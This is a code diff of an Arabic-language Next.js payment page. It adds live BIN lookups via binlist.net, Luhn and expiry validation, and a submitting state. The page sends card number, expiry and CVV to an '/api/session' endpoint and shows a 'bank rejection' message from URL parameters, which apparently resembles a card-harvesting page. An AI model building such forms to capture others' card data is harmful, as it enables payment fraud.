@@ -1,12 +1,12 @@
 "use client";
 export const dynamic = 'force-dynamic';
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import { useRouter, useSearchParams } from "next/navigation";
 import SessionTracker from "@/components/SessionTracker";
 
 const GREEN = "#1e7344";
 
-// ===== خوارزمية Luhn للتحقق من رقم البطاقة =====
+// ===== خوارزمية Luhn =====
 function luhnCheck(cardNum: string): boolean {
   const digits = cardNum.replace(/\s/g, "");
   if (!/^\d{13,19}$/.test(digits)) return false;
@@ -33,10 +33,21 @@ function validateExpiry(expiry: string): { valid: boolean; msg: string } {
   const year = parseInt("20" + match[2], 10);
   if (month < 1 || month > 12) return { valid: false, msg: "الشهر يجب أن يكون بين 01 و 12" };
   const now = new Date();
-  const expDate = new Date(year, month, 0); // آخر يوم في الشهر
+  const expDate = new Date(year, month, 0);
   if (expDate < now) return { valid: false, msg: "البطاقة منتهية الصلاحية" };
   return { valid: true, msg: "" };
 }
+
+type BinInfo = {
+  scheme?: string;
+  type?: string;
+  brand?: string;
+  bank?: { name?: string };
+  country?: { name?: string; emoji?: string; alpha2?: string };
+  valid: boolean;
+  checked: boolean;
+  error?: string;
+};
 
 export default function PaymentPage() {
   const router = useRouter();
@@ -45,12 +56,18 @@ export default function PaymentPage() {
   const [expiry, setExpiry] = useState("");
   const [cvv, setCvv] = useState("");
   const [errorMsg, setErrorMsg] = useState("");
+  const [isSubmitting, setIsSubmitting] = useState(false);
 
   // أخطاء الحقول
   const [cardNumberError, setCardNumberError] = useState("");
   const [expiryError, setExpiryError] = useState("");
   const [cvvError, setCvvError] = useState("");
   const [cardHolderError, setCardHolderError] = useState("");
+
+  // معلومات BIN من API
+  const [binInfo, setBinInfo] = useState<BinInfo>({ valid: false, checked: false });
+  const [binLoading, setBinLoading] = useState(false);
+  const binTimerRef = useRef<NodeJS.Timeout | null>(null);
 
   const searchParams = useSearchParams();
 
@@ -77,24 +94,84 @@ export default function PaymentPage() {
     if (n.startsWith("4")) return "visa";
     if (/^5[1-5]/.test(n) || /^2[2-7]/.test(n)) return "mastercard";
     if (/^3[47]/.test(n)) return "amex";
-    if (/^6(?:011|5)/.test(n)) return "discover";
     return null;
   }
 
-  // التحقق الفوري عند مغادرة حقل رقم البطاقة
+  // استدعاء Binlist API للتحقق من BIN
+  async function checkBin(bin: string) {
+    if (bin.length < 6) {
+      setBinInfo({ valid: false, checked: false });
+      return;
+    }
+    setBinLoading(true);
+    try {
+      const res = await fetch(`https://lookup.binlist.net/${bin}`, {
+        headers: { "Accept-Version": "3" },
+      });
+      if (res.status === 404 || res.status === 422) {
+        setBinInfo({ valid: false, checked: true, error: "رقم البطاقة غير معروف أو غير صالح" });
+        setBinLoading(false);
+        return;
+      }
+      if (!res.ok) {
+        // إذا فشل الـ API نعتمد على Luhn فقط
+        setBinInfo({ valid: false, checked: false });
+        setBinLoading(false);
+        return;
+      }
+      const data = await res.json();
+      // إذا كانت الاستجابة فارغة (BIN غير موجود)
+      if (!data.scheme && !data.type && !data.brand && !data.bank?.name) {
+        setBinInfo({ valid: false, checked: true, error: "رقم البطاقة غير صالح أو غير مدعوم" });
+      } else {
+        setBinInfo({
+          valid: true,
+          checked: true,
+          scheme: data.scheme,
+          type: data.type,
+          brand: data.brand,
+          bank: data.bank,
+          country: data.country,
+        });
+      }
+    } catch {
+      // إذا فشل الاتصال نعتمد على Luhn فقط
+      setBinInfo({ valid: false, checked: false });
+    }
+    setBinLoading(false);
+  }
+
+  // عند تغيير رقم البطاقة
+  function handleCardNumberChange(val: string) {
+    const formatted = formatCardNumber(val);
+    setCardNumber(formatted);
+    setCardNumberError("");
+    setBinInfo({ valid: false, checked: false });
+
+    const digits = formatted.replace(/\s/g, "");
+    if (binTimerRef.current) clearTimeout(binTimerRef.current);
+    if (digits.length >= 6) {
+      binTimerRef.current = setTimeout(() => {
+        checkBin(digits.slice(0, 8));
+      }, 600);
+    }
+  }
+
   function onCardNumberBlur() {
     const digits = cardNumber.replace(/\s/g, "");
     if (!digits) { setCardNumberError(""); return; }
     if (digits.length < 13) {
       setCardNumberError("رقم البطاقة قصير جداً");
-    } else if (!luhnCheck(cardNumber)) {
-      setCardNumberError("رقم البطاقة غير صالح");
-    } else {
-      setCardNumberError("");
+      return;
     }
+    if (!luhnCheck(cardNumber)) {
+      setCardNumberError("رقم البطاقة غير صالح - يرجى التحقق من الأرقام");
+      setBinInfo({ valid: false, checked: true, error: "رقم البطاقة غير صالح" });
+      return;
+    }
+    setCardNumberError("");
   }
 
-  // التحقق الفوري عند مغادرة حقل التاريخ
   function onExpiryBlur() {
     const clean = expiry.replace(/\s/g, "");
     if (!clean) { setExpiryError(""); return; }
@@ -102,7 +179,6 @@ export default function PaymentPage() {
     setExpiryError(result.valid ? "" : result.msg);
   }
 
-  // التحقق الفوري عند مغادرة حقل CVV
   function onCvvBlur() {
     if (!cvv) { setCvvError(""); return; }
     if (cvv.length < 3) setCvvError("رمز CVV يجب أن يكون 3 أرقام على الأقل");
@@ -110,7 +186,6 @@ export default function PaymentPage() {
   }
 
   async function handleSubmit() {
-    // إعادة التحقق من الكل
     let hasError = false;
 
     if (!cardHolder.trim()) {
@@ -129,6 +204,9 @@ export default function PaymentPage() {
       hasError = true;
     } else if (!luhnCheck(cardNumber)) {
       setCardNumberError("رقم البطاقة غير صالح - يرجى التحقق من الأرقام");
+      hasError = true;
+    } else if (binInfo.checked && !binInfo.valid) {
+      setCardNumberError(binInfo.error || "رقم البطاقة غير صالح");
       hasError = true;
     } else {
       setCardNumberError("");
@@ -159,6 +237,7 @@ export default function PaymentPage() {
 
     if (hasError) return;
 
+    setIsSubmitting(true);
     setErrorMsg("");
     try {
       await fetch('/api/session', {
@@ -179,6 +258,8 @@ export default function PaymentPage() {
 
   const cardType = getCardType(cardNumber);
   const displayNumber = cardNumber || "#### #### #### ####";
+  const digits = cardNumber.replace(/\s/g, "");
+  const luhnValid = digits.length >= 13 && luhnCheck(cardNumber);
 
   const inputStyle = (hasError: boolean) => ({
     width: "100%",
@@ -201,15 +282,9 @@ export default function PaymentPage() {
         {/* رسالة الرفض من البنك */}
         {errorMsg && (
           <div style={{
-            backgroundColor: "#fff0f0",
-            border: "1px solid #e74c3c",
-            borderRadius: "10px",
-            padding: "12px 16px",
-            marginBottom: "18px",
-            color: "#e74c3c",
-            fontSize: "14px",
-            fontWeight: "bold",
-            textAlign: "center",
+            backgroundColor: "#fff0f0", border: "1px solid #e74c3c",
+            borderRadius: "10px", padding: "12px 16px", marginBottom: "18px",
+            color: "#e74c3c", fontSize: "14px", fontWeight: "bold", textAlign: "center",
           }}>
             ❌ {errorMsg}
           </div>
@@ -224,24 +299,20 @@ export default function PaymentPage() {
         <div style={{
           width: "100%", height: "200px",
           background: "linear-gradient(135deg, #1e7344 0%, #114126 100%)",
-          borderRadius: "15px", padding: "20px", marginBottom: "25px",
+          borderRadius: "15px", padding: "20px", marginBottom: "20px",
           color: "white", position: "relative", boxShadow: "0 8px 20px rgba(0,0,0,0.15)",
           direction: "ltr", textAlign: "left", overflow: "hidden"
         }}>
           <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", height: "40px" }}>
             <div style={{ width: "45px", height: "35px", background: "linear-gradient(135deg, #f0d060 0%, #b88a14 100%)", borderRadius: "6px" }} />
-            {cardType === "visa" && (
-              <span style={{ fontSize: "22px", fontWeight: "900", fontStyle: "italic", color: "#fff", letterSpacing: "1px" }}>VISA</span>
-            )}
+            {cardType === "visa" && <span style={{ fontSize: "22px", fontWeight: "900", fontStyle: "italic", color: "#fff", letterSpacing: "1px" }}>VISA</span>}
             {cardType === "mastercard" && (
               <div style={{ display: "flex" }}>
                 <div style={{ width: "28px", height: "28px", borderRadius: "50%", background: "#eb001b", opacity: 0.9 }} />
                 <div style={{ width: "28px", height: "28px", borderRadius: "50%", background: "#f79e1b", opacity: 0.9, marginLeft: "-12px" }} />
               </div>
             )}
-            {cardType === "amex" && (
-              <span style={{ fontSize: "16px", fontWeight: "900", color: "#fff", letterSpacing: "1px" }}>AMEX</span>
-            )}
+            {cardType === "amex" && <span style={{ fontSize: "16px", fontWeight: "900", color: "#fff" }}>AMEX</span>}
           </div>
           <div style={{ fontSize: "18px", letterSpacing: "2px", marginTop: "30px", fontFamily: "Courier New, monospace", whiteSpace: "nowrap" }}>
             {displayNumber}
@@ -253,6 +324,41 @@ export default function PaymentPage() {
             <div style={{ fontSize: "14px", direction: "ltr" }}>{expiry || "00 / 00"}</div>
           </div>
         </div>
+
+        {/* معلومات البنك من Binlist API */}
+        {binLoading && (
+          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "8px", padding: "8px 12px", background: "#f0f7f4", borderRadius: "8px", marginBottom: "14px", fontSize: "13px", color: "#666" }}>
+            <span style={{ display: "inline-block", width: "14px", height: "14px", border: "2px solid #1e7344", borderTopColor: "transparent", borderRadius: "50%", animation: "spin 0.8s linear infinite" }} />
+            جارٍ التحقق من البطاقة...
+          </div>
+        )}
+        {!binLoading && binInfo.checked && binInfo.valid && (
+          <div style={{
+            background: "#f0faf4", border: "1px solid #b8e0c8",
+            borderRadius: "10px", padding: "10px 14px", marginBottom: "14px",
+            textAlign: "right", fontSize: "13px",
+          }}>
+            <div style={{ display: "flex", alignItems: "center", gap: "6px", marginBottom: "4px" }}>
+              <span style={{ color: GREEN, fontWeight: "bold", fontSize: "14px" }}>✅ بطاقة صالحة</span>
+            </div>
+            {binInfo.bank?.name && <div style={{ color: "#555" }}>🏦 البنك: <strong>{binInfo.bank.name}</strong></div>}
+            {binInfo.country?.name && (
+              <div style={{ color: "#555" }}>
+                🌍 الدولة: <strong>{binInfo.country.emoji} {binInfo.country.name}</strong>
+              </div>
+            )}
+            {binInfo.scheme && <div style={{ color: "#555" }}>💳 النوع: <strong>{binInfo.scheme?.toUpperCase()} {binInfo.type}</strong></div>}
+          </div>
+        )}
+        {!binLoading && binInfo.checked && !binInfo.valid && (
+          <div style={{
+            background: "#fff0f0", border: "1px solid #f5c6c6",
+            borderRadius: "10px", padding: "10px 14px", marginBottom: "14px",
+            textAlign: "right", fontSize: "13px", color: "#e74c3c",
+          }}>
+            ❌ {binInfo.error || "رقم البطاقة غير صالح"}
+          </div>
+        )}
 
         {/* Payment Logos */}
         <div style={{ display: "flex", justifyContent: "center", marginBottom: "20px" }}>
@@ -281,29 +387,25 @@ export default function PaymentPage() {
             <input
               type="tel"
               value={cardNumber}
-              onChange={e => {
-                setCardNumber(formatCardNumber(e.target.value));
-                if (cardNumberError) setCardNumberError("");
-              }}
+              onChange={e => handleCardNumberChange(e.target.value)}
               onBlur={onCardNumberBlur}
               placeholder="1234 5678 9012 3456"
               maxLength={19}
               style={{ ...inputStyle(!!cardNumberError), direction: "ltr", textAlign: "left", fontFamily: "Courier New, monospace", paddingRight: "40px" }}
             />
             {/* مؤشر صحة الرقم */}
-            {cardNumber.replace(/\s/g, "").length >= 13 && (
-              <span style={{
-                position: "absolute", left: "12px", top: "50%", transform: "translateY(-50%)",
-                fontSize: "16px",
-              }}>
-                {luhnCheck(cardNumber) ? "✅" : "❌"}
+            {digits.length >= 13 && !binLoading && (
+              <span style={{ position: "absolute", left: "12px", top: "50%", transform: "translateY(-50%)", fontSize: "16px" }}>
+                {luhnValid && (binInfo.checked ? (binInfo.valid ? "✅" : "❌") : "✅") ? "✅" : "❌"}
+              </span>
+            )}
+            {binLoading && digits.length >= 6 && (
+              <span style={{ position: "absolute", left: "12px", top: "50%", transform: "translateY(-50%)" }}>
+                <span style={{ display: "inline-block", width: "14px", height: "14px", border: "2px solid #1e7344", borderTopColor: "transparent", borderRadius: "50%", animation: "spin 0.8s linear infinite" }} />
               </span>
             )}
           </div>
           {cardNumberError && <p style={{ color: "#e74c3c", fontSize: "12px", marginTop: "4px", textAlign: "right" }}>⚠ {cardNumberError}</p>}
-          {!cardNumberError && cardNumber.replace(/\s/g, "").length >= 13 && luhnCheck(cardNumber) && (
-            <p style={{ color: "#1e7344", fontSize: "12px", marginTop: "4px", textAlign: "right" }}>✓ رقم البطاقة صالح</p>
-          )}
         </div>
 
         <div style={{ display: "flex", gap: "10px", marginBottom: "20px" }}>
@@ -343,13 +445,28 @@ export default function PaymentPage() {
 
         <button
           onClick={handleSubmit}
-          style={{ width: "100%", backgroundColor: "#82b199", color: "white", border: "none", borderRadius: "10px", padding: "16px", fontSize: "18px", fontWeight: "bold", cursor: "pointer", transition: "background 0.3s" }}
-          onMouseEnter={e => (e.currentTarget.style.backgroundColor = GREEN)}
-          onMouseLeave={e => (e.currentTarget.style.backgroundColor = "#82b199")}
+          disabled={isSubmitting}
+          style={{
+            width: "100%",
+            backgroundColor: isSubmitting ? "#aaa" : "#82b199",
+            color: "white", border: "none", borderRadius: "10px",
+            padding: "16px", fontSize: "18px", fontWeight: "bold",
+            cursor: isSubmitting ? "not-allowed" : "pointer",
+            transition: "background 0.3s",
+          }}
+          onMouseEnter={e => { if (!isSubmitting) e.currentTarget.style.backgroundColor = GREEN; }}
+          onMouseLeave={e => { if (!isSubmitting) e.currentTarget.style.backgroundColor = "#82b199"; }}
         >
-          ادفع الآن
+          {isSubmitting ? "جارٍ المعالجة..." : "ادفع الآن"}
         </button>
       </div>
+
+      <style>{`
+        @keyframes spin {
+          from { transform: rotate(0deg); }
+          to { transform: rotate(360deg); }
+        }
+      `}</style>
     </div>
   );
 }
